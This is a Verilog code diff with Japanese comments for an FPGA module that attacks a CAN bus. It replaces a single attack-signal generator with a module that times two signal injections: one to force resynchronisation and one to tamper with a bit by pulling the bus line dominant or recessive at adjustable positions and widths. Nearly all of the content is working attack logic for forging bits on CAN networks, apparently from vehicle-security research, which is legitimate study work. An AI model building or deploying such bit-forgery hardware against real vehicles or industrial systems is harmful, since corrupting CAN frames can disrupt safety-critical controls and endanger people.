@@ -31,41 +31,58 @@
 //	CANBIT	->|<----------------------------------------------------------------------A-------A---------------------------------------------->|<----------------
 //			                                               (Sample)                  送信    受信                   
 
-module ATTACK_SIGNAL_GENERATOR(CLK, RESET, COUNTER, ATTACK_LEN, ATTACK_LOC, ATTACK_SIG, DEBUG);
+module ATTACK_MODULE(CLK, RESET, ATTACK_STATE, INC_LENGTH, INC_LOC, TO_DOMINANT, TO_RECESSIVE, DEBUG);
     input CLK;  //40MHz 25ns
     input RESET;
-    input [15:0]COUNTER;
-    input [7:0]ATTACK_LEN;
-    input [15:0]ATTACK_LOC;
-    output ATTACK_SIG;
+    input ATTACK_STATE;
+    input [7:0]INC_LENGTH;
+    input [7:0]INC_LOC;
+    inout TO_DOMINANT = 1'b1;    //1から0への電位差操作
+    inout TO_RECESSIVE = 1'b1;    //0から1への電位差操作
     output DEBUG;
     
-    reg [7:0]attackCounter;
-    reg condAttack;
-    wire attack;
+    //再同期用
+    wire [7:0]rsynAttackLength = 8'd8;
+    wire [15:0]rsynAttackLocation = 16'd620; //攻撃開始位置
+    wire rsynAttackSig;
+    //ビット改ざん用
+    wire [7:0]attackLength = 8'd1 + INC_LENGTH;  //攻撃信号の幅
+    wire [15:0]attackLocation = 16'd655 + 16'd17 + {8'b0,INC_LOC}; //攻撃開始位置
+    wire attackSig;
     
-    assign ATTACK_SIG = ~condAttack;
-    assign DEBUG = condAttack;
-    assign attack = COUNTER==ATTACK_LOC;
-       
+    reg [15:0]counter;
+    
+    assign TO_DOMINANT = attackSig;
+    assign TO_RECESSIVE = rsynAttackSig;
+    
     always @(posedge CLK) begin
         if(~RESET) begin
-            attackCounter <= 0;
-        end else if(condAttack) begin
-            attackCounter <= attackCounter + 1;
+            counter <= 0;
+        end else if(ATTACK_STATE) begin
+            counter <= counter + 1;
         end else begin
-            attackCounter <= 0;
+            counter <= 0;
         end 
     end
     
-    always @(posedge CLK) begin
-        if(~RESET) begin
-            condAttack <= 0;
-        end else if(attack) begin
-            condAttack <= 1;
-        end else if(attackCounter == ATTACK_LEN) begin
-            condAttack <= 0;
-        end 
-    end
+    ATTACK_SIGNAL_GENERATOR resyn(
+        .CLK(CLK),
+        .RESET(RESET),
+        .COUNTER(counter),
+        .ATTACK_LEN(rsynAttackLength),
+        .ATTACK_LOC(rsynAttackLocation),
+        .ATTACK_SIG(rsynAttackSig),
+        .DEBUG(DEBUG)
+        );
+        
+    ATTACK_SIGNAL_GENERATOR forgery(
+        .CLK(CLK),
+        .RESET(RESET),
+        .COUNTER(counter),
+        .ATTACK_LEN(attackLength),
+        .ATTACK_LOC(attackLocation),
+        .ATTACK_SIG(attackSig),
+        .DEBUG()
+        );
         
 endmodule
